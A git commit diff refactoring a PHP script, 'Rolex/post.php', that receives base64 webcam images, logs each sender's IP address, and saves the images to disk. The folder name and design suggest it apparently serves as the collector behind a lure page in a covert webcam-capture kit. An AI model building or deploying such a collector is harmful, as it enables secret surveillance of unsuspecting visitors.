e35b8293c806f9e2d6b8746f67e5558d99c27337
Mugilalan <106120909+Mugilalan@users.noreply.github.com>
2025-02-25 14:19:40 +0800

    Update post.php

--- Rolex/post.php
+++ Rolex/post.php
@@ -1,16 +1,15 @@
 /* post.php - Captures images from webcam and logs them */
 <?php
 $date = date('dMYHis');
-$imageData = $_POST['cat'];
+$imageData = $_POST['cat'] ?? '';
 $ipAddress = $_SERVER['REMOTE_ADDR'];
-if (!empty($_POST['cat'])) {
-    error_log("Received image from $ipAddress at $date" . "\r\n", 3, "Log.log");
+
+if (!empty($imageData)) {
+    error_log("Received image from $ipAddress at $date\r\n", 3, "Log.log");
+    $filteredData = substr($imageData, strpos($imageData, ",")+1);
+    $unencodedData = base64_decode($filteredData);
+    $fileName = 'cam_' . $date . '_' . str_replace(' ', '_', $ipAddress) . '.png';
+    file_put_contents($fileName, $unencodedData);
 }
-$filteredData = substr($imageData, strpos($imageData, ",")+1);
-$unencodedData = base64_decode($filteredData);
-$fileName = 'cam_' . $date . '_' . str_replace(' ', '_', $ipAddress) . '.png';
-$fp = fopen($fileName, 'wb');
-fwrite($fp, $unencodedData);
-fclose($fp);
 exit();
 ?>
